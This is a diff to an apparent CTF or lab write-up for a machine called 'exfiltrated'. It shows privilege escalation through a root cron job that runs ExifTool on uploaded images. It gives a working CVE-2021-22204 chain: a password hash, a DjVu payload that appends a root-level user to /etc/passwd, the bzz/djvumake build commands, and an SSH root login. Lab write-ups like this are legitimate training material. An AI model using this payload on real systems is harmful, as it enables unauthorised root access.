@@ -67,7 +67,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 * *     * * *   root    bash /opt/image-exif.sh
 ```
-The cron job is 
+The cron job is use to automate the extraction of metadata from images uploaded to a web server
 ```
 $ cat /opt/image-exif.sh  
 #! /bin/bash
@@ -90,4 +90,34 @@ done
 
 echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
 ```
+There is a ExifTool 12.23 - Arbitrary Code Execution (CVE-2021–22204)  
+we can use it to add a root user in the payload and login as root shell  
+https://www.exploit-db.com/exploits/50911  
 
+We make a password
+```
+openssl passwd password123
+$1$l9kweacK$bTMwIAX37KSVy6.PUHEhk0
+```
+Then make to payload to add user root2
+```
+$ cat payload          
+(metadata "\c${system('echo \"root2:$1$l9kweacK$bTMwIAX37KSVy6.PUHEhk0:0:0:root:/root:/bin/bash\" >> /etc/passwd')};")
+```
+converted the payload to bzz format and embedded it using djvumake
+```
+$ bzz payload payload.bzz
+$ djvumake exploit.jpg.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
+```
+upload to the image loaction where the cron job execute at /var/www/html/subrion/uploads  
+After one minute the user root2 have been add to root group with our password
+```
+$ cat /etc/passwd
+root2:$1$l9kweacK$bTMwIAX37KSVy6.PUHEhk0:0:0:root:/root:/bin/bash
+```
+ssh to the root2
+```
+$ ssh root2@192.168.156.163
+root@exfiltrated:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
